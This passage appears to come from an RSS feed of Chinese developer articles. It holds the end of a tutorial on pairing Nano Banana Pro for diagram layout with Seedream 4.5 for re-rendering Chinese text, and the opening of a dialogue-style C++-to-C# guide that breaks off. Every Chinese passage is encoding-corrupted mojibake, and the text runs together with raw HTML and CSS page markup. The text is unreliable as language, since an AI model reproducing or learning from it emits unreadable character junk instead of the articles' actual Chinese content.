</li>
</ul>
<p>æ‰€ä»¥ï¼Œä¸å…¶åå¤æ”¹æç¤ºè¯â€œè®©ä¸­æ–‡æ›´æ¸…æ™°â€ï¼Œä¸å¦‚æ‰¿è®¤æ¨¡å‹å¼ºé¡¹ï¼š
<strong>nano banana è´Ÿè´£â€œå›¾â€ï¼ŒSeedream è´Ÿè´£â€œå­—â€ã€‚</strong></p>
<hr/>
<h2 data-id="heading-1">2. è§£å†³æ€è·¯ï¼šNano Banana + Seedream 4.5 çš„ä¸¤æ®µå¼å·¥ä½œæµ</h2>
<p>è¿™ä¸ªæ–¹æ¡ˆçš„å…³é”®ç‚¹æ˜¯â€œåˆ†å·¥â€ï¼š</p>
<blockquote>
<ul>
<li><strong>ç¬¬ä¸€æ­¥ï¼ˆNano Bananaï¼‰</strong> ï¼šç”Ÿæˆä½ æƒ³è¦çš„æ¶æ„å›¾/æµ·æŠ¥ç‰ˆå¼/å†…å®¹ç»“æ„
ä¼˜å…ˆè¿½æ±‚ï¼šå¸ƒå±€æ¸…æ™°ã€æ¨¡å—åˆç†ã€å›¾å½¢ç¾è§‚ã€é£æ ¼æ­£ç¡®</li>
<li><strong>ç¬¬äºŒæ­¥ï¼ˆSeedream 4.5ï¼‰</strong> ï¼šä¿æŒå›¾å½¢ä¸å˜ï¼Œä»…å¯¹æ–‡å­—åšâ€œé‡ç»˜/é‡æ’/é‡æ–°æ¸²æŸ“â€
ä¼˜å…ˆè¿½æ±‚ï¼šä¸­æ–‡å­—ä½“æ¸…æ™°ã€ç¬”ç”»æ­£ç¡®ã€å¯¹é½ä¸ä¹±ã€é£æ ¼ä¸€è‡´</li>
</ul>
</blockquote>
<p>æœ€ç»ˆæ•ˆæœé€šå¸¸æ˜¯ï¼š
<strong>ç”»é¢ä¾æ—§æ˜¯ Nano Banana çš„é«˜çº§æ„Ÿï¼Œä½†ä¸­æ–‡è¾¾åˆ°äº†å¯äº¤ä»˜æ°´å¹³ã€‚</strong></p>
<hr/>
<h2 data-id="heading-2">3. å®æˆ˜ï¼šå…ˆç”¨ Nano Banana ç”Ÿæˆæ¶æ„å›¾ï¼ˆä¸­æ–‡ä¼šç³Šï¼‰</h2>
<p>å…ˆç”¨ Nano Banana Proï¼Œè¾“å…¥å¦‚ä¸‹æç¤ºè¯ç”Ÿæˆâ€œç®€æ´æ¶æ„å›¾â€ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">ç®—æ³•ä½“ç³»å»ºè®¾çš„æ€»ä½“æ¶æ„æè¿°å¦‚ä¸‹ï¼š
'''
ä¸€ã€ æ ¸å¿ƒç›®æ ‡ä¸æ€»ä½“æ€è·¯

æ ¸å¿ƒç›®æ ‡ï¼š æ„å»ºä¸€ä¸ªè¦†ç›–æ•°æ®ã€ç‰¹å¾ã€æ¨¡å‹ã€éƒ¨ç½²ã€è¿ç»´å…¨ç”Ÿå‘½å‘¨æœŸçš„æ ‡å‡†åŒ–ç®—æ³•ç”Ÿäº§ä½“ç³»ï¼Œå®ç°è½¦è”ç½‘æ•°æ®é©±åŠ¨ä¸‹çš„æ¨¡å‹â€œå·¥ä¸šåŒ–â€ç”Ÿäº§ä¸â€œè§„æ¨¡åŒ–â€ä»·å€¼è¾“å‡ºã€‚

æ€»ä½“æ€è·¯ï¼š ä»¥MLOpsç†å¿µä¸ºæ¡†æ¶ï¼Œä»¥è½¦è¾†ç½‘è”æ•°æ®ä¸ºåŸºçŸ³ï¼Œä»¥å…·ä½“ä¸šåŠ¡åœºæ™¯ï¼ˆå¦‚çŠ¶æ€æ„ŸçŸ¥ã€æ„å›¾è¯†åˆ«ï¼‰ä¸ºç‰µå¼•ï¼Œé€šè¿‡æµç¨‹è§„èŒƒåŒ–ã€å·¥å…·å¹³å°åŒ–ã€åä½œæ ‡å‡†åŒ–ï¼Œæ‰“é€šä»æ•°æ®åˆ°ä»·å€¼çš„ç«¯åˆ°ç«¯é“¾è·¯ï¼Œç¡®ä¿ç®—æ³•é¡¹ç›®å¯ç®¡ç†ã€å¯é‡å¤ã€å¯è¿½æº¯ã€å¯è¿­ä»£ã€‚æœ¬è§„åˆ’å°†é‡ç‚¹é˜è¿°ä»¥ç®—åŠ›å¹³å°ä¸ºæ‰¿è½½çš„ç®—æ³•å·¥ç¨‹ä½“ç³»æ ¸å¿ƒæ¨¡å—ã€å†…éƒ¨æµç¨‹åŠå…¶ä¸ä¸šåŠ¡åŸŸçš„æ˜ å°„å…³ç³»ã€‚
'''

è¯·æ ¹æ®ä»¥ä¸Šæè¿°ä½¿ç”¨ nano banana pro ç”»ä¸€å‰¯ç®€æ´æ¶æ„å›¾ã€‚

ç”Ÿæˆçš„ç®€æ´æ¶æ„å›¾è¦æ±‚å¦‚ä¸‹ï¼š

<span class="hljs-bullet">-</span> ä¸éœ€è¦Mermaidå›¾ï¼Œéœ€è¦ç”Ÿæˆä¸€å¼ ç®€æ´çš„æ¶æ„å›¾ç‰‡ï¼Œè®©é¢†å¯¼ä¸€çœ‹å°±æ˜ç™½ã€‚
<span class="hljs-bullet">-</span> å›¾ç‰‡å½“ä¸­çš„è¯­è¨€æ–‡å­—ä½¿ç”¨ä¸­æ–‡ã€‚
<span class="hljs-bullet">-</span> ä¸è¦å‡ºç° nano banana pro çš„logoã€‚
</code></pre>
<p>è¿™ä¸€æ­¥é€šå¸¸èƒ½å¾—åˆ°ï¼š</p>
<ul>
<li>æ¶æ„åˆ†å±‚åˆç†</li>
<li>æ¨¡å—ä¹‹é—´å…³ç³»æ˜ç¡®</li>
<li>å›¾å½¢è¯­è¨€ç»Ÿä¸€
ä½†ä½ ä¼šå‘ç°ï¼š<strong>å›¾ä¸Šçš„ä¸­æ–‡æ–‡å­—æ‰­æ›²ã€ä¸æ¸…æ™°</strong>ï¼Œç”šè‡³æœ‰é”™å­—/ç¼ºç¬”ç”»ã€‚</li>
</ul>
<div>
<div>
<div class="cxd-Flex" data-role="container">
  <span class="cxd-TplField fr-view">
    <span>
        <img class="image-container" src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/063c1eb002214f6cbdd35399751f6a0d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbWFudGNo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769004555&amp;x-signature=S2Nznqzjjx73A2nUCp8yNeCQZGk%3D" alt="" loading="lazy"/>
    </span>
  </span>
</div>
</div>
<br/><br/>
</div>
<p>åˆ«æ€¥ï¼Œè¿™æ­£æ˜¯æˆ‘ä»¬è¦è¿›å…¥ä¸‹ä¸€æ­¥çš„æ—¶æœºã€‚</p>
<hr/>
<h2 data-id="heading-3">4. éƒ¨ç½² Personal LLM APIï¼Œå¹¶é…ç½® Seedream 4.5</h2>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬ç”¨ <code>Personal LLM API</code> é¡¹ç›®æ¥æ¥å…¥ <code>Seedream 4.5</code>ã€‚<code>Personal LLM API</code>ç»å¯¹ Seedream åšäº†é€‚é…ï¼ŒåŒ…æ‹¬è‡ªåŠ¨è¯»å–è¾“å…¥å›¾ç‰‡çš„å®½é«˜æ¯”ã€åˆ†è¾¨ç‡ç­‰ä¿¡æ¯ï¼Œå‡å°‘æ‰‹åŠ¨é…ç½®æˆæœ¬ã€‚</p>
<ol>
<li>éƒ¨ç½² Personal LLM APIï¼Œè¯¦ç»†ä»‹ç»ï¼š<a href="https://link.juejin.cn?target=http%3A%2F%2Fera.dx3906.info%2F%23%2Fblog-detail%3Fblog_id%3D79305249130964" target="_blank" rel="noopener" title="http://era.dx3906.info/#/blog-detail?blog_id=79305249130964" ref="nofollow noopener noreferrer">ä¸ªäºº LLM æ¥å£æœåŠ¡å¼€æºé¡¹ç›®ï¼šä¸€ä¸ªç®€æ´çš„ AI å…¥å£</a></li>
<li>åœ¨æ¨¡å‹é…ç½®ä¸­æ·»åŠ /å¯ç”¨ <strong>Seedream4.5 è§†è§‰æ¨¡å‹</strong></li>
</ol>
<div>
<div>
<div class="cxd-Flex" data-role="container">
  <span class="cxd-TplField fr-view">
    <span>
        <img class="image-container" src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/82ea4cee0e5b4a47ad029b5435fd21b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbWFudGNo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769004555&amp;x-signature=EAUnUGAAiT%2FDzQmkh%2Fau2LnqjDI%3D" alt="" loading="lazy"/>
    </span>
  </span>
</div>
</div>
<br/><br/>
</div>
<hr/>
<h2 data-id="heading-4">5. ç”¨ Cherry Studio é…ç½®å·²éƒ¨ç½²çš„ LLM æ¥å£</h2>
<p>ç„¶åç”¨ <code>Cherry Studio</code> ä½œä¸ºæœ¬åœ°å®¢æˆ·ç«¯ï¼Œé…ç½®ä½ åˆšéƒ¨ç½²å¥½çš„æ¥å£ï¼š</p>
<ul>
<li>æ–°å¢è‡ªå®šä¹‰æ¨¡å‹æœåŠ¡</li>
<li>å¡«å†™ base_url / api_keyï¼ˆæŒ‰ä½ é¡¹ç›®å®é™…é…ç½®ï¼‰</li>
<li>åœ¨æ¨¡å‹åˆ—è¡¨ä¸­æ·»åŠ   <code>Seedream 4.5</code> æ¨¡å‹ã€‚</li>
</ul>
<div>
<div>
<div class="cxd-Flex" data-role="container">
  <span class="cxd-TplField fr-view">
    <span>
        <img class="image-container" src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2aa706dc1ca24d04ba768f076e7d2290~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbWFudGNo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769004555&amp;x-signature=PGjMkInWUNbqe2mTLj4W8G43DJg%3D" alt="" loading="lazy"/>
    </span>
  </span>
</div>
</div>
<br/><br/>
</div>
<p>è¿™æ ·ä½ å°±æ‹¥æœ‰äº†ä¸€ä¸ªéå¸¸é¡ºæ‰‹çš„â€œå›¾ç‰‡æ–‡å­—é‡æ¸²æŸ“å·¥ä½œå°â€ï¼š</p>
<blockquote>
<p>æŠŠå›¾æ‹–è¿›å» + ä¸€å¥è¯æç¤ºè¯ â†’ ç­‰å‡ åç§’ â†’ å‡ºæ¸…æ™°ç‰ˆæœ¬ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-5">6. å…³é”®ä¸€æ­¥ï¼šç”¨ Seedream 4.5 å¯¹â€œä¸­æ–‡æ–‡å­—é‡æ–°æ¸²æŸ“â€</h2>
<p>ç°åœ¨æŠŠ <code>Nano Banana</code> ç”Ÿæˆçš„é‚£å¼ ä¸­æ–‡ç³Šæ‰çš„æ¶æ„å›¾ä¸Šä¼ ç»™ Seedream 4.5ï¼Œ<code>Cherry Studio</code>é€‰æ‹©æ¨¡å‹ï¼Œå¹¶ä½¿ç”¨ä»¥ä¸‹æç¤ºè¯ï¼š</p>
<blockquote>
<p>è¯·æŠŠå›¾ç‰‡ä¸Šçš„æ–‡å­—é‡æ–°æ¸²æŸ“ï¼Œæ ·å¼é¢œè‰²è¦ä¸€è‡´ï¼Œæ–‡å­—ä¹Ÿè¦ä¸€è‡´ï¼Œå…¶ä»–çš„ä¸éœ€è¦æ”¹åŠ¨ã€‚ç”Ÿæˆçš„å›¾ç‰‡è¦4kåˆ†è¾¨ç‡ï¼Œå®½é«˜æ¯”æ˜¯æ™ºèƒ½é€‚åº”åŸå›¾çš„å®½é«˜æ¯”ã€‚</p>
</blockquote>
<p>è¿™å¥æç¤ºè¯çš„â€œæœ‰æ•ˆç‚¹â€åœ¨äºï¼š</p>
<ul>
<li><strong>åªæ”¹æ–‡å­—</strong>ï¼šé¿å…æ¨¡å‹é‡ç»˜å¯¼è‡´ç‰ˆå¼è·‘æ‰</li>
<li><strong>æ ·å¼é¢œè‰²ä¸€è‡´</strong>ï¼šä¿æŒåŸå›¾è§‚æ„Ÿç»Ÿä¸€</li>
<li><strong>æ–‡å­—ä¹Ÿè¦ä¸€è‡´</strong>ï¼šå¼ºè°ƒä¸è¦æ”¹å­—ã€ä¸æ€»ç»“ã€ä¸æ›¿æ¢</li>
<li><strong>4K + è‡ªé€‚åº”æ¯”ä¾‹</strong>ï¼šç›´æ¥æ‹¿å»æ±‡æŠ¥/æ’æ–‡æ¡£ï¼Œæ¸…æ™°åº¦è¶³å¤Ÿã€‚<strong>å·²å°è¯•è¿‡ 2k åˆ†è¾¨ç‡ï¼Œä¸èƒ½å¤Ÿè¾¾åˆ°æ–‡å­—é‡æ–°æ¸²æŸ“çš„ç²¾åº¦ã€‚</strong></li>
</ul>
<p>ç”±äº <code>Personal LLM API</code> åšäº†é€‚é…ï¼Œè¿™ä¸€æ­¥é€šå¸¸ä¸éœ€è¦ä½ å†æ‰‹åŠ¨å†™â€œåŸå›¾å°ºå¯¸æ˜¯å¤šå°‘â€ï¼Œå®ƒä¼šè‡ªåŠ¨å¤„ç†å®½é«˜æ¯”å’Œåˆ†è¾¨ç‡ç­–ç•¥ã€‚</p>
<p>ç­‰å¾…å‡ åç§’åï¼Œä½ ä¼šå¾—åˆ°ä¸€å¼ â€œå‡ ä¹ä¸€æ¨¡ä¸€æ ·ï¼Œä½†ä¸­æ–‡æ¸…æ™°äº†â€çš„æ–°å›¾ã€‚<strong>å¦‚æœç¨å¾®æœ‰ç‚¹ç‘•ç–µå¯é‡å¤ç”Ÿæˆ1åˆ°2æ¬¡å³å¯ã€‚</strong></p>
<hr/>
<h2 data-id="heading-6">7. æ•ˆæœå¯¹æ¯”ï¼šå­—æ¸…æ™°ã€æ— é”™ä½ã€å›¾å½¢ä¿æŒä¸å˜</h2>
<p>å¯¹æ¯” <code>Nano Banana</code> çš„åŸå›¾ vs <code>Seedream</code> é‡æ¸²æŸ“åçš„å›¾ï¼Œå¸¸è§æå‡éå¸¸æ˜æ˜¾ï¼š</p>
<ul>
<li>ä¸­æ–‡ç¬”ç”»å®Œæ•´ï¼Œä¸å†ç²˜è¿</li>
<li>å­—ä½“è¾¹ç¼˜é”åˆ©ï¼Œä¸å†ç³Šæˆå—</li>
<li>å¯¹é½æ›´ç¨³å®šï¼Œé”™ä½æ˜¾è‘—å‡å°‘</li>
<li>èƒŒæ™¯ã€è¿çº¿ã€è‰²å—ã€å¸ƒå±€åŸºæœ¬ä¿æŒ</li>
</ul>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼š
<strong>Nano Banana ç»™ä½ â€œé«˜çº§çš„æ¶æ„å›¾â€ï¼ŒSeedream4.5 ç»™ä½ â€œèƒ½äº¤ä»˜çš„ä¸­æ–‡â€ã€‚</strong> ä»¥ä¸‹æ˜¯å¯¹æ¯”å›¾ï¼š</p>
<div>
<div>
<div class="cxd-Flex" data-role="container">
  <span class="cxd-TplField fr-view">
    <span>
        <img class="image-container" src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fe143c6c766047849028b6e33c2ec4f8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbWFudGNo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769004555&amp;x-signature=H5Wjm76anb0AvmpEXJTkItAeX%2BA%3D" alt="" loading="lazy"/>
    </span>
  </span>
</div>
</div>
<br/><br/>
</div>
<div>
<div>
<div class="cxd-Flex" data-role="container">
  <span class="cxd-TplField fr-view">
    <span>
        <img class="image-container" src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/133e5d70eb7a453ead1563c51b4c6fec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbWFudGNo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769004555&amp;x-signature=sjGSiR%2FOQE6JDmFqsf9sBgB8FqU%3D" alt="" loading="lazy"/>
    </span>
  </span>
</div>
</div>
<br/><br/>
</div>
<hr/>
<h2 data-id="heading-7">8. è¿™ä¸ªæŠ€å·§èƒ½ç”¨åœ¨å“ªäº›åœºæ™¯ï¼Ÿ</h2>
<ul>
<li>æ¶æ„å›¾ / æµç¨‹å›¾ / æ—¶åºå›¾ï¼ˆé Mermaidï¼‰</li>
<li>PPT å°é¢ã€æµ·æŠ¥å‹é¡µé¢ï¼ˆä¸­æ–‡æ ‡é¢˜æ¸…æ™°ï¼‰</li>
<li>äº§å“åŠŸèƒ½ç»“æ„å›¾ã€ä¸šåŠ¡é—­ç¯å›¾</li>
<li>æ´»åŠ¨å®£ä¼ å›¾ã€è¯¾ç¨‹æµ·æŠ¥ã€Banner</li>
<li>ä»»ä½•â€œå›¾å¾ˆæ¼‚äº®ï¼Œä½†å­—ä¸è¡Œâ€çš„ AI ç”Ÿæˆå›¾</li>
</ul>
<p>ä¸€å¥è¯ï¼š
<strong>å…ˆç”Ÿæˆï¼Œå†é‡æ¸²æŸ“æ–‡å­—</strong>ï¼Œæ˜¯ç›®å‰ä¸­æ–‡å›¾ç‰‡äº¤ä»˜çš„ä¸€æ¡é«˜æ€§ä»·æ¯”è·¯å¾„ã€‚</p>
<p>å¾ˆå¤šäººå¡åœ¨â€œç”Ÿæˆä¸€å¼ èƒ½ç”¨çš„å›¾â€è¿™ä¸€æ­¥ï¼Œå…¶å®å¹¶ä¸æ˜¯æ¨¡å‹ä¸è¡Œï¼Œè€Œæ˜¯æ²¡æœ‰é‡‡ç”¨ç»„åˆå¼å·¥ä½œæµã€‚</p>
<p>å½“ä½ æŒæ¡äº†ï¼š</p>
<ul>
<li><strong>nano bananaï¼š</strong> è´Ÿè´£æ„å›¾ã€å®¡ç¾ã€ç»“æ„ç†è§£</li>
<li><strong>Seedream 4.5ï¼š</strong> è´Ÿè´£ä¸­æ–‡åƒç´ çº§æ¸²æŸ“</li>
</ul>
<p>ä½ å°±èƒ½æŠŠ AI å‡ºå›¾ä»â€œç©å…·â€å˜æˆâ€œç”Ÿäº§å·¥å…·â€ï¼ŒçœŸæ­£åšåˆ°å¯äº¤ä»˜ã€å¯å¤ç”¨ã€å¯è§„æ¨¡åŒ–ã€‚</p>
<hr/>
<p><strong>æƒ³çŸ¥é“å¦‚ä½•ä½¿ç”¨ Nano Banana ç”Ÿæˆæ›´å¤šé«˜è´¨é‡å›¾å—ï¼Ÿ</strong></p>
<p>æˆ‘ä¹Ÿä¸ºå¤§å®¶æ•´ç†äº†ä¸€ä»½  <strong>ã€Šé«˜è´¨é‡Nano Bananaç”Ÿå›¾æç¤ºè¯é›†åˆã€‹</strong> ï¼Œæ¶µç›–äº†ç§‘æŠ€é£ã€æ‰å¹³é£ã€æ‰‹ç»˜é£ç­‰å¤šç§é£æ ¼ï¼Œå…³æ³¨å…¬ä¼—å·å¹¶å›å¤  <strong>â€œnano bananaæç¤ºè¯â€</strong>  å³å¯è·å–ï¼</p>
<p>è¯¦è§ï¼š</p>
<p><a href="https://link.juejin.cn?target=http%3A%2F%2Fera.dx3906.info%2F%23%2Fblog-detail%3Fblog_id%3D79894071326906" target="_blank" rel="noopener" title="http://era.dx3906.info/#/blog-detail?blog_id=79894071326906" ref="nofollow noopener noreferrer">å»ºè®®æ”¶è— | ç©è½¬ Nano Banana AIï¼Œè¿™ 11 ç»„æç¤ºè¯è®©ä½ ç§’å˜å¤§ç¥ï¼</a></p>
<hr/>
<p><em>æœ¬æ–‡æ¶‰åŠçš„å¼€æºé¡¹ç›® Personal LLM APIï¼Œæ¬¢è¿ star å…±å»ºğŸ‘ï¼š</em></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FNLP-LOVE%2Fpersonal-llm-api" target="_blank" rel="noopener" title="https://github.com/NLP-LOVE/personal-llm-api" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FNLP-LOVE%2Fpersonal-llm-api" target="_blank" title="https://github.com/NLP-LOVE/personal-llm-api" ref="nofollow noopener noreferrer">github.com/NLP-LOVE/peâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»C++åˆ°C#çš„è½¬å‹å®Œå…¨æŒ‡å—]]></title>    <link>https://juejin.cn/post/7595029084283928630</link>    <guid>https://juejin.cn/post/7595029084283928630</guid>    <pubDate>2026-01-14T14:10:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595029084283928630" data-draft-id="7595043440520101894" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»C++åˆ°C#çš„è½¬å‹å®Œå…¨æŒ‡å—"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-14T14:10:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç äº‹æ¼«è°ˆ"/> <meta itemprop="url" content="https://juejin.cn/user/1972974802965230"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»C++åˆ°C#çš„è½¬å‹å®Œå…¨æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1972974802965230/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç äº‹æ¼«è°ˆ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T14:10:18.000Z" title="Wed Jan 14 2026 14:10:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>å°æ</strong>ï¼šç‹å“¥ï¼Œæˆ‘ä»C++è½¬C#å·²ç»ä¸¤å‘¨äº†ï¼Œæ„Ÿè§‰ä»£ç å†™å¾—å¾ˆåˆ«æ‰­ã€‚å¾ˆå¤šC++çš„ä¹ æƒ¯åœ¨C#é‡Œå¥½åƒéƒ½ä¸å¯¹åŠ²ï¼Œä½ èƒ½ä¸èƒ½ç»™æˆ‘ä¸€äº›å»ºè®®ï¼Ÿ</p>
<p><strong>ç‹å“¥</strong>ï¼šå½“ç„¶å¯ä»¥ï¼æˆ‘å½“åˆè½¬å‹æ—¶ä¹Ÿç»å†è¿‡è¿™ä¸ªé˜¶æ®µã€‚å’±ä»¬å°±ä»å‡ ä¸ªæœ€é‡è¦çš„æ–¹é¢å¼€å§‹å§ã€‚é¦–å…ˆï¼Œä½ è¦å®Œæˆä¸€ä¸ªæœ€é‡è¦çš„å¿ƒæ€è½¬å˜â€”â€”</p>
<h2 data-id="heading-0">å¿ƒæ€è½¬å˜ï¼šä»â€œæ§åˆ¶ä¸€åˆ‡â€åˆ°â€œä¿¡ä»»æ¡†æ¶â€</h2>
<p><strong>ç‹å“¥</strong>ï¼šåœ¨C++é‡Œï¼Œæˆ‘ä»¬ä¹ æƒ¯äº†æŒæ§ä¸€åˆ‡ï¼šå†…å­˜ã€èµ„æºã€åº•å±‚å®ç°ã€‚ä½†åœ¨C#é‡Œï¼Œä½ éœ€è¦å­¦ä¼šä¿¡ä»».NETæ¡†æ¶å’Œåƒåœ¾å›æ”¶å™¨ã€‚</p>
<p><strong>å°æ</strong>ï¼šæˆ‘ç¡®å®æ€»æ˜¯æƒ³æ‰‹åŠ¨ç®¡ç†ä¸€åˆ‡ï¼Œçœ‹åˆ°<code>new</code>å°±ä¸‹æ„è¯†æƒ³æ‰¾<code>delete</code>ã€‚</p>
<p><strong>ç‹å“¥</strong>ï¼šè¿™æ­£æ˜¯ç¬¬ä¸€ä¸ªè¦æ”¹çš„ä¹ æƒ¯ï¼æˆ‘ç»™ä½ çœ‹ä¸ªä¾‹å­ï¼š</p>
